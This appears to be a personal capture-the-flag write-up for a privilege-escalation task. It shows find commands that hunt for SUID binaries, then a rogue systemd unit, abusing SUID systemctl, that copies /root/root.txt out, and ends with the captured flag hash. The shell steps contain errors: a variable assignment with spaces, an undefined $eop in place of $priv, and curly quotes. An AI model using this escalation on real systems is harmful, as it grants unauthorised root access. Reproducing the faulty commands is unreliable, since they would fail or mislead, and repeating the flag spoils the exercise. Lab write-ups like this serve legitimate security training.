# Task 5: Privilege Escalation

  
1. On the system, search for all SUID files. What file stands out?  
  
find / -user root -perm -4000 -exec ls -ldb {} \;  
  
find / -user root -perm -4000 -print 2>/dev/null  
  
find / -perm -4000 2> /dev/null | xargs ls -lah  
  
[/bin/systemctl](file:///bin/systemctl)  
  
2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?  
  
Become root and get the last flag (/root/root.txt)  
  
10.10.63.21  
  
10.10.63.21:3333/internal/index.php  
  
  
Create variable that holds unique file  
priv = $(mktemp).service  
  
Create unit file and assign to variable.   
echo '[Service]  
ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output”  
[Install]  
WantedBy=multi-user.target' > $priv  
  
  
Run unit file  
/bin/systemctl link $eop  
/bin/systemctl enable --now $priv  
  
To see if output is present  
ls -lah /tmp   
  
To print out flag from output  
cat /tmp/output  
  
  
a58ff8579f0a9270368d33a9966c7fd5  
